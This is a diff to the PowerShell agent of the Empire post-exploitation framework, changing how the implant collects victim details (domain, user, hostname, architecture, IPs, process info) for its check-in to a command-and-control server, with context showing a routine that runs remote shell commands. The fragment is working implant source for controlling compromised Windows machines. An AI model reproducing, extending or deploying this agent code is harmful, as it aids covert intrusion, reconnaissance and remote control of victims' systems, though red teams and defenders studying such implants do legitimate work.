@@ -228,7 +228,27 @@ function Invoke-Empire {
         # no nonce for normal execution
         $str = '0|';
         $str += $Script:ControlServers[$Script:ServerIndex];
-        $str += '|' + [Environment]::UserDomainName+'|'+[Environment]::UserName+'|'+[Environment]::MachineName;
+
+        $domain = (Get-WmiObject Win32_ComputerSystem).Domain
+        $domain = $domain.Replace("`n", "")
+        $domain = $domain.Replace("`r", "")
+
+        $username = (Get-WmiObject Win32_ComputerSystem).UserName | Out-String
+        $username = $username.Replace("`n","")
+        $username = $username.Replace("`r","")
+
+        $hostname = (Get-WmiObject Win32_ComputerSystem).Name
+        $hostname = $hostname.Replace("`n", "")
+        $hostname = $hostname.Replace("`r", "")
+
+        $arch = Get-OperatingSystemArch
+        $arch = $arch.Replace("`n", "")
+        $arch = $arch.Replace("`r", "")
+        $arch = $arch.Replace(" ", "")
+
+        $str += '|' + $domain+'|'+$username+'|'+$hostname;
+
+
         $p = (Get-WmiObject Win32_NetworkAdapterConfiguration|Where{$_.IPAddress}|Select -Expand IPAddress);
         $ip = @{$true=$p[0];$false=$p}[$p.Length -lt 6];
         #if(!$ip -or $ip.trim() -eq '') {$ip='0.0.0.0'};
@@ -246,17 +266,9 @@ function Invoke-Empire {
         $n = [System.Diagnostics.Process]::GetCurrentProcess();
         $str += '|'+$n.ProcessName+'|'+$n.Id;
         $str += "|powershell|" + $PSVersionTable.PSVersion.Major;
-        $str += "|" + $env:PROCESSOR_ARCHITECTURE;
+        $str += "|" + $arch;
         $str;
     }
-
-    # # TODO: add additional callback servers ?
-    # function Add-Servers {
-    #     param([string[]]$BackupServers)
-    #     foreach ($backup in $BackupServers) {
-    #         $Script:ControlServers = $Script:ControlServers + $backup
-    #     }
-    # }
 
     # handle shell commands and return any results
     function Invoke-ShellCommand {
